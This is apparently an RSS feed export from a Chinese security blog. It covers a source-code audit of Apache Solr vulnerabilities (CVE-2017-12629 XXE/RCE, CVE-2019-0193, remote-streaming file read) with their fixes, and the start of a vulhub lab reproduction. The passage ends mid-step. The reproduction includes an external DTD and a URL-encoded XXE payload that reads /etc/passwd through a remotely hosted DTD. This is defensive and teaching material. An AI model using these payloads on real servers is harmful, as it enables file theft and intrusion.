&lt;h2 id=&#34;编写运行规则建议通过官方给出的练习题进行练习&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#编写运行规则建议通过官方给出的练习题进行练习&#34;&gt;#&lt;/a&gt; 编写运行规则，建议通过官方给出的练习题进行练习&lt;/h2&gt;
&lt;h1 id=&#34;传送门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#传送门&#34;&gt;#&lt;/a&gt; 传送门&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://codeql.github.com/docs/&#34;&gt;CodeQL 官方文档&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://lab.github.com/githubtraining&#34;&gt;练习室&lt;/a&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/06/10/solr%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/</guid>
            <title>solr漏洞审计</title>
            <link>http://example.com/2022/06/10/solr%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/</link>
            <category>solr, 代码审计</category>
            <pubDate>Fri, 10 Jun 2022 10:31:38 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;环境搭建&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境搭建&#34;&gt;#&lt;/a&gt; 环境搭建&lt;/h1&gt;
&lt;p&gt;各版本源码下载：&lt;br&gt;
&lt;a href=&#34;http://archive.apache.org/dist/lucene/solr/7.0.1/&#34;&gt;http://archive.apache.org/dist/lucene/solr/7.0.1/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;此处 win 环境，下载源码&lt;br&gt;
&lt;img src=&#34;:/312d3247700c41e7bc385411a9e8ada5&#34; alt=&#34;d90b95d958f7a8aa03ec037e23ff6565.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;在源码根目录打开 cmd，运行 &lt;code&gt;ant ivy-bootstrap&lt;/code&gt; &lt;br&gt;
&lt;img src=&#34;:/6f5d62f573e04359872a5e2d522769cb&#34; alt=&#34;65611596abbf48fd002528219ce04da6.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;解压后用 idea 打开&lt;br&gt;
&lt;img src=&#34;:/cba08f47dd2648029ea82c1667c0a32e&#34; alt=&#34;6398b74ee6a4f3388ea89aa77e051942.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;（这里可以使用 ant 编译成 idea 项目后，再用 idea 直接打开，在项目根目录下运行 ant 命令即可）&lt;/p&gt;
&lt;p&gt;在 solr 目录下，运行 &lt;code&gt;ant server&lt;/code&gt;  创建 solr server&lt;br&gt;
&lt;img src=&#34;:/5c02f7c7549a46e2a814060569170417&#34; alt=&#34;568e847efbb2bd3f814629269b607938.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;报错： &lt;code&gt;Could  not find file C:\Users\HAN91\.ant\lib\ivy-2.3.0.jar to generate checksum&lt;/code&gt; &lt;br&gt;
ivy 下载&lt;br&gt;
&lt;a href=&#34;http://ant.apache.org/ivy/download.cgi&#34;&gt; http://ant.apache.org/ivy/download.cgi&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;漏洞原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞原理&#34;&gt;#&lt;/a&gt; 漏洞原理&lt;/h1&gt;
&lt;h2 id=&#34;cve-2017-12629&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2017-12629&#34;&gt;#&lt;/a&gt; CVE-2017-12629&lt;/h2&gt;
&lt;h3 id=&#34;xxe&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xxe&#34;&gt;#&lt;/a&gt; XXE&lt;/h3&gt;
&lt;p&gt;Lucene 包含了一个查询解析器支持 XML 格式进行数据查询，并且解析 xml 数据时，未设置任何防御措施，导致我们可引入任意恶意外部实体&lt;br&gt;
而 Solr 由于使用 Lucenne 作为核心语义分析引擎，因此受到影响&lt;/p&gt;
&lt;p&gt;漏洞点：&lt;br&gt;
 &lt;code&gt;org.apache.lucene.queryparser.xml.CoreParser#parseXML&lt;/code&gt; &lt;br&gt;
 此处为解析 xml 数据的方法，其中并未包含任何 xxe 防御措施&lt;br&gt;
因此可正常解析我们引入的恶意外部实体&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; Document &lt;span class=&#34;title&#34;&gt;parseXML&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(InputStream pXmlFile)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; ParserException &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DocumentBuilder db = &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      db = dbf.newDocumentBuilder();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (Exception se) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ParserException(&lt;span class=&#34;string&#34;&gt;&amp;quot;XML Parser configuration error&amp;quot;&lt;/span&gt;, se);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    org.w3c.dom.Document doc = &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      doc = db.parse(pXmlFile);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;catch&lt;/span&gt; (Exception se) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ParserException(&lt;span class=&#34;string&#34;&gt;&amp;quot;Error parsing XML stream:&amp;quot;&lt;/span&gt; + se, se);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; doc;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;漏洞修复&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞修复&#34;&gt;#&lt;/a&gt; 漏洞修复&lt;/h3&gt;
&lt;p&gt;官方修复是增加 XXE 通用防御，这也是我们常用的 xxe 修复方法&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;DocumentBuilderFactory.setFearture(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://javax.xml.XMLConstants/feature/secure-processing&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以下列出一些通过设置解析器行为，达到对 xxe 进行限制的方法&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 这是优先选择. 如果不允许DTDs (doctypes) ,几乎可以阻止所有的XML实体攻击&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setFeature(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://apache.org/xml/features/disallow-doctype-decl&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 如果不能完全禁用DTDs，最少采取以下措施，必须两项同时存在&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setFeature(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://xml.org/sax/features/external-general-entities&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;false&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;// 防止外部实体POC&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setFeature(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://xml.org/sax/features/external-parameter-entities&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;false&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;// 防止参数实体POC&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rce&#34;&gt;#&lt;/a&gt; RCE&lt;/h3&gt;
&lt;p&gt;RCE 需要使用到 SolrCloud Collections API，所以 RCE 只影响 Solrcloud 分布式系统&lt;/p&gt;
&lt;p&gt;漏洞点：&lt;br&gt;
 &lt;code&gt;org.apache.solr.core.RunExecutableListener#exec&lt;/code&gt; &lt;br&gt;
&lt;img src=&#34;:/51de3416f045459f909444415033be1f&#34; alt=&#34;0f16537ae621dca652c50598b2934616.png&#34;&gt;&lt;br&gt;
 我们看见一下这行代码执行了命令，并传入了三个参数&lt;br&gt;
 &lt;code&gt;proc = Runtime.getRuntime().exec(cmd, envp ,dir);&lt;/code&gt; &lt;br&gt;
 查看 API&lt;br&gt;
cmdarray：命令字符串&lt;br&gt;
 envp：代表 “环境” 变量设置，如果 envp 是 null ，则子进程继承当前进程的环境设置&lt;br&gt;
 dir：新子进程的工作目录由 dir 指定 。 如果 dir 是 null ，则子进程继承当前进程的当前工作目录。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;:/a75c9e8d1f58409c88e9f1ca628a3c1c&#34; alt=&#34;9ec0917d903603b1067a566e250c5627.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么我们怎么才能控制以上这三个参数呢？&lt;br&gt;
在初始化时，通过初始化传入的参数 args&lt;br&gt;
 分别获得这三个参数 &lt;code&gt;cmd,dir,envp&lt;/code&gt; &lt;br&gt;
&lt;img src=&#34;:/2417a9d2aee24484b0d8d60a7945c5bf&#34; alt=&#34;eec102985f87ff2f05623f84d74ab34c.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;找到调用 exec () 的有两处&lt;br&gt;
 &lt;code&gt;org.apache.solr.core.RunExecutableListener#postCommit&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;org.apache.solr.core.RunExecutableListener#newSearcher&lt;/code&gt; &lt;br&gt;
&lt;img src=&#34;:/3ce9c774ef2d49e5a5e2ebdf53c84848&#34; alt=&#34;c52c3a71430c5dd42e23cbf7eba7973e.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;因此我们可以 config API 调用以上两个命令执行命令&lt;br&gt;
关于 config API 更多信息可查看传送门中放置的官网链接&lt;br&gt;
&lt;img src=&#34;:/4c612e57459d403384463b4165fc4786&#34; alt=&#34;fa07883023d57f29334905273587cf9b.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;漏洞修复-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞修复-2&#34;&gt;#&lt;/a&gt; 漏洞修复&lt;/h3&gt;
&lt;p&gt;官方修复直接将该类删除&lt;/p&gt;
&lt;h2 id=&#34;cve-2019-0193&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2019-0193&#34;&gt;#&lt;/a&gt; CVE-2019-0193&lt;/h2&gt;
&lt;p&gt;DataImportHandler 是一个可选但流行的模块，用于从数据库和其他来源提取数据。它有一个特性，即整个 DIH (the Data Import Handler, 数据导入处理程序) 配置可以来自请求的 &lt;code&gt;dataConfig&lt;/code&gt;  参数&lt;/p&gt;
&lt;p&gt;DIH 管理屏幕的调试模式使用它来方便 DIH 配置的调试 / 开发。因为 DIH 配置可以包含脚本，并未对脚本进行任何过滤检测，所以这个参数存在安全风险&lt;/p&gt;
&lt;p&gt;从 Solr 的 8.2.0 版本开始，使用这个参数需要将 Java System 属性  &lt;code&gt;enable.dih.dataConfigParam&lt;/code&gt;  设置为  &lt;code&gt;true&lt;/code&gt; ，此时也将存在该漏洞&lt;/p&gt;
&lt;p&gt;DHI 和 script 官方文档链接放在传送门中&lt;/p&gt;
&lt;p&gt;我们可以根据官方文档的说明，插入脚本并执行，其中 entity 标签支持 jndi 以及 script&lt;br&gt;
&lt;img src=&#34;:/9366ca25d9524160843ca21a3d69b18d&#34; alt=&#34;a6303a016339679c882babc40deace8b.png&#34;&gt;&lt;br&gt;
 漏洞点：&lt;br&gt;
 &lt;code&gt;org.apache.solr.handler.dataimport.DataImportHandler&lt;/code&gt; &lt;br&gt;
 其中 &lt;code&gt;handleRequestBody()&lt;/code&gt;  函数接收了前端传入的 &lt;code&gt;dataConfig&lt;/code&gt; &lt;br&gt;
&lt;img src=&#34;:/5136fb3fb5994945a840fa8c82b62825&#34; alt=&#34;08710fb1d7d531e129962d80bb22941e.png&#34;&gt;&lt;br&gt;
 后面就不再分析了，因为这个漏洞是 solr 该模块允许执行脚本，官方文档中也描述了该模块以及脚本的使用&lt;/p&gt;
&lt;h3 id=&#34;漏洞修复-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞修复-3&#34;&gt;#&lt;/a&gt; 漏洞修复&lt;/h3&gt;
&lt;p&gt;官方修复增加 &lt;code&gt;enable.dih.dataConfigParam&lt;/code&gt;  参数，默认 = false，仅在启动 solr 时带上参数 &lt;code&gt;enable.dih.dataConfigParam=true&lt;/code&gt;  才可启动 debug 模式&lt;/p&gt;
&lt;h2 id=&#34;remote-streaming-fileread任意文件读取&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#remote-streaming-fileread任意文件读取&#34;&gt;#&lt;/a&gt; Remote-Streaming-Fileread（任意文件读取）&lt;/h2&gt;
&lt;p&gt;官方文档中写明，solrconfig.xml 中 &lt;code&gt;enableRemoteStreaming=&amp;quot;true&amp;quot;&lt;/code&gt;  时允许远程流&lt;br&gt;
&lt;img src=&#34;:/b53eef83d3f047f78ea7b9607b951e0f&#34; alt=&#34;d4e2c6715cd93bccb5ba0645bf44d89c.png&#34;&gt;&lt;br&gt;
 因此我们可以通过 config API，启用远程读取流&lt;br&gt;
 &lt;code&gt;enableRemoteStreaming = “true”&lt;/code&gt; ，将允许任何人向任何 URL 或本地文件发送请求&lt;br&gt;
 &lt;code&gt;DumpRequestHandler = “true”&lt;/code&gt; ，它将允许任何人查看系统上的任何文件。&lt;br&gt;
漏洞点：&lt;br&gt;
 &lt;code&gt;solr/core/src/java/org/apache/solr/servlet/SolrRequestParsers.java&lt;/code&gt; &lt;br&gt;
&lt;img src=&#34;:/60256974dd3742f98a58144d8dd67750&#34; alt=&#34;d9c8060b808d32f29db7535380472c6e.png&#34;&gt;&lt;br&gt;
 其中通过以下代码获取前端传入数据&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;strs = params.getParams( CommonParams.STREAM_FILE );&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在进行文件获取时，未对传入的 strs 进行任何检测和过滤，并生成 stream&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;( &lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String file : strs ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ContentStreamBase stream = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ContentStreamBase.FileStream( &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; File(file) );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;( contentType != &lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt; ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          stream.setContentType( contentType );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        streams.add( stream );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在 &lt;code&gt;solr/solrj/src/java/org/apache/solr/common/params/CommonParams.java&lt;/code&gt;  中，写明了 &lt;code&gt;stream.file&lt;/code&gt;  即为传入的 &lt;code&gt;CommonParams.STREAM_FILE&lt;/code&gt; &lt;br&gt;
&lt;img src=&#34;:/24ec295b558e4aac8846e0ab3e142848&#34; alt=&#34;e0c12b5404c9aa9db8cd8eb2b87f7d3e.png&#34;&gt;&lt;br&gt;
 其中若传入 url 可导致 ssrf，原理同上&lt;/p&gt;
&lt;h3 id=&#34;修复建议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修复建议&#34;&gt;#&lt;/a&gt; 修复建议&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;控制 solr 访问权限，增加访问口令&lt;/li&gt;
&lt;li&gt;不对外网开放 solr&lt;/li&gt;
&lt;li&gt;关闭 ConfigAPI：在 bin 目录下的 solr.in.cmd 中加入一行 set SOLR_OPTS=% SOLR_OPTS% -Ddisable.configEdit=true；然后关闭远程读取文件流，默认不开启&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;cve-2019-17558&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2019-17558&#34;&gt;#&lt;/a&gt; CVE-2019-17558&lt;/h2&gt;
&lt;p&gt;传送门：&lt;br&gt;
&lt;a href=&#34;https://www.pianshen.com/article/23101236137/&#34;&gt;本地部署 idea 调试环境&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ&#34;&gt; Apache Solr 组件安全&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;http://rui0.cn/archives/993&#34;&gt; XXE 漏洞原理以及防御方式&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://blog.csdn.net/whatday/article/details/106959989/&#34;&gt; apache solr 远程代码执行漏洞 (cve-2019-0193)&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://solr.apache.org/guide/6_6/config-api.html&#34;&gt;config API&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://solr.apache.org/guide/8_1/uploading-structured-data-store-data-with-the-data-import-handler.html#dih-concepts-and-terminology&#34;&gt;DHI&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://solr.apache.org/guide/6_6/uploading-structured-data-store-data-with-the-data-import-handler.html#the-scripttransformer&#34;&gt;script&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://solr.apache.org/security.html&#34;&gt;solr 历史漏洞&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://solr.apache.org/guide/6_6/content-streams.html&#34;&gt; content-streams&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Copyright ©milkii0&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/06/10/solr%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
            <title>solr漏洞复现</title>
            <link>http://example.com/2022/06/10/solr%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
            <category>solr, 漏洞复现</category>
            <pubDate>Fri, 10 Jun 2022 09:10:46 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;solr是什么&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#solr是什么&#34;&gt;#&lt;/a&gt; solr 是什么&lt;/h1&gt;
&lt;p&gt;Solr 是开源的，基于 Lucene Java 的搜索服务器。&lt;/p&gt;
&lt;p&gt;易于加入到 Web 应用程序中，会生成基于 HTTP 的管理界面。&lt;br&gt;
后台管理界面 Dashboard 仪表盘中，可查看当前 Solr 的版本信息。&lt;br&gt;
(概念详解，移步传送门)&lt;/p&gt;
&lt;h1 id=&#34;环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境&#34;&gt;#&lt;/a&gt; 环境&lt;/h1&gt;
&lt;p&gt;漏洞复现环境均使用 vulhub 中的环境&lt;/p&gt;
&lt;h1 id=&#34;cve-2017-12629-xxe&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cve-2017-12629-xxe&#34;&gt;#&lt;/a&gt; CVE-2017-12629-XXE&lt;/h1&gt;
&lt;h2 id=&#34;影响版本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#影响版本&#34;&gt;#&lt;/a&gt; 影响版本&lt;/h2&gt;
&lt;p&gt;Apache Solr &amp;lt; 7.1&lt;br&gt;
Apache Lucene &amp;lt; 7.1&lt;/p&gt;
&lt;h2 id=&#34;复现过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#复现过程&#34;&gt;#&lt;/a&gt; 复现过程&lt;/h2&gt;
&lt;p&gt;启动环境后打开管理界面：&lt;a href=&#34;http://192.168.77.128:8983/solr/#/&#34;&gt;http://192.168.77.128:8983/solr/#/&lt;/a&gt;&lt;br&gt;
solr-spec 版本：7.0.1，lucene-spec 版本：7.0.1，符合漏洞要求&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;../_resources/bd2a3461fc7bccc9854dd362e359e6c9.png&#34; alt=&#34;bd2a3461fc7bccc9854dd362e359e6c9.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;利用外部实体读取敏感文件信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#利用外部实体读取敏感文件信息&#34;&gt;#&lt;/a&gt; 利用外部实体读取敏感文件信息&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;开一个 web 服务，在下面创建一个 1.dtd 文件，文件内容如下&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;meta-keyword&#34;&gt;SYSTEM&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;file:///etc/passwd&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;!ENTITY % &lt;span class=&#34;meta-keyword&#34;&gt;ent&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;quot;&amp;lt;!ENTITY data SYSTEM &amp;#x27;:%file;&amp;#x27;&amp;gt;&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;读取 Linux 下 /etc/passwd 文件信息&lt;br&gt;
引用外部实体&lt;br&gt;
 payload： &lt;code&gt;http://192.168.77.128:8983/solr/demo/select?&amp;amp;q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2f192.168.77.128%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&amp;amp;wt=xml&amp;amp;defType=xmlparser&lt;/code&gt; &lt;br&gt;
URL 解码后：&lt;br&gt;
